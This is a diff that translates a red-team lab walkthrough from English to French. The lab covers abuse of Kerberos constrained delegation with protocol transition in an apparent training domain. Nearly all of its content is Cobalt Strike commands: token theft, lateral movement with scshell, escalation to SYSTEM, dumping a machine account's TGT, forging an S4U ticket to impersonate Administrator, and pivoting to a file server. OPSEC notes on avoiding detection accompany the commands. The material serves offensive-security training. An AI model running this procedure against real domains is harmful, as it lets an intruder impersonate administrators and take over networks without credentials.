@@ -1,10 +1,10 @@
-# Constrained Delegation (with protocol transition) Lab
+# Lab — Constrained Delegation avec Protocol Transition
 
->The objective of this lab is to abuse constrained delegation with protocol transition to obtain access to a back-end service.
+>L’objectif est d’exploiter la **Constrained Delegation** avec **Protocol Transition** pour accéder à un service back-end.
 
-## Enumeration
+## Énumération
 
-1. Launch Cobalt Strike and connect to the team server.
+1. Lancer Cobalt Strike et se connecter au team server.
 
 ```cs
 sleep 5 5
@@ -15,43 +15,43 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 getuid
 ```
 
-2. Search for computers whose *msDS-AllowedToDelegateTo* attribute is not null.
+2. Rechercher les ordinateurs dont l’attribut `msDS-AllowedToDelegateTo` n’est pas vide.
   
 ```Beacon-nocolor
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ```
 
-⚠️ This should return *lon-ws-1$*, which is permitted to delegate to *cifs/lon-fs-1*.
+⚠️ Le résultat attendu est `lon-ws-1$`, autorisé à effectuer une delegation vers `cifs/lon-fs-1`.
 
-3. Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
+3. Vérifier avec PowerShell que le flag **TRUSTED_TO_AUTH_FOR_DELEGATION** est actif.
 
 ```Terminal-nocolor
 [Convert]::ToBoolean(16781312 -band 16777216)
 ```
 
-⚠️ This should return *True*.
+⚠️ Le résultat attendu est `True`.
 
-4. Move laterally to *lon-ws-1* — you need a SYSTEM beacon on that host to dump its machine account TGT.
+4. Effectuer un **Lateral Movement** vers `lon-ws-1`. Un Beacon SYSTEM y est nécessaire pour récupérer le TGT du compte machine.
 
-> **Why SYSTEM on lon-ws-1?** The constrained delegation abuse in the next phase requires the lon-ws-1$ machine account TGT (LUID `0x3e7`). Only SYSTEM can read the machine account's Kerberos session. A user-context beacon is not sufficient.
+> **Pourquoi SYSTEM sur lon-ws-1 ?** La phase suivante nécessite le TGT du compte machine `lon-ws-1$` (LUID `0x3e7`). Seul SYSTEM peut lire cette session Kerberos ; un Beacon utilisateur ne suffit pas.
 
-## Impersonate rsteel Workstation Admin on lon-ws-1
+## Impersonation de rsteel sur lon-ws-1
 
 ```cs
 ps                              // find rsteel process — look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
 steal_token <rsteel-cmd-pid>        // OPSEC-🟢SAFE — token dup in-process, no Event 4648
 ```
 
-## Jump to lon-ws-1 
+## Jump vers lon-ws-1 
 
 ```cs
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-ws-1 smb
 ```
 
-## Escalate to SYSTEM on lon-ws-1 beacon**
+## Obtenir SYSTEM sur le Beacon lon-ws-1
 
-The new beacon lands as `CONTOSO\rsteel`. You need SYSTEM to read `lon-ws-1$` machine account TGT:
+Le nouveau Beacon s’exécute sous `CONTOSO\rsteel`. Il faut obtenir SYSTEM pour lire le TGT du compte machine `lon-ws-1$` :
 
 ```cs
 // New beacon on lon-ws-1:
@@ -63,7 +63,7 @@ beacon> getuid                                  // confirm NT AUTHORITY\SYSTEM
 
 ## Exploitation
 
-1. Dump the TGT for *lon-ws-1* computer and observe the hex LUID is `3x7`  
+1. Récupérer le TGT de `lon-ws-1` et repérer le LUID hexadécimal `0x3e7`  
 
 ```Beacon-nocolor
 sleep 5 5
@@ -82,9 +82,9 @@ krb_s4u /ticket:[base64_output_direct_fromkrb_dump_TGT] /service:cifs/lon-fs-1 /
 krb_describe /ticket:[base64_output_direct_fromkrb_dump_TGT]
 ```
 
-3. Use the S4U ticket to access the C$ share on *lon-fs-1* as Administrator.
+3. Utiliser le ticket S4U pour accéder au partage `C$` de `lon-fs-1` en tant qu’Administrator.
 
-> The S4U ticket is for `cifs/lon-fs-1` impersonating `Administrator` — inject it into a sacrificial logon session and access the share directly. No need to know Administrator's password.
+> Le ticket S4U cible `cifs/lon-fs-1` et permet l’impersonation d’`Administrator`. L’injecter dans une session de logon dédiée pour accéder au partage sans connaître le mot de passe.
 
 ```cs
 // Step 1 — Create sacrificial logon session (OPSEC-🟠CAUTION — Event 4648)
@@ -94,13 +94,13 @@ beacon> make_token CONTOSO\Administrator FakePass!
 // Step 2 — Save the S4U ticket kirbi to attacker desktop (run in attacker PowerShell, NOT beacon)
 ```
 
-On the Attacker Desktop PowerShell (not in beacon — avoids child process):
+Depuis PowerShell sur l’Attacker Desktop (hors Beacon pour éviter un child process) :
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64 TICKET from krb_s4u output]"))
 ```
 
->Back in beacon:  
+> De retour dans le Beacon :  
 
 ```cs
 // Step 3 — Inject S4U ticket into the logon session (OPSEC-🟠CAUTION)
@@ -114,7 +114,7 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-fs-1 smb
 ```
 
-## new beacon lon-fs-1
+## Nouveau Beacon sur lon-fs-1
 
 ```cs
 ls c:\
@@ -122,4 +122,4 @@ powerpick [System.IO.File]::WriteAllText("C:\rto.txt","liham")
 powerpick gc C:\rto.txt
 ```
 
-⚠️ In this lab, you have learned how to abuse constrained delegation (with protocol transition) to impersonate any user to the delegated service.
+⚠️ Ce lab montre l’exploitation de la Constrained Delegation avec Protocol Transition pour effectuer une impersonation vers le service délégué.
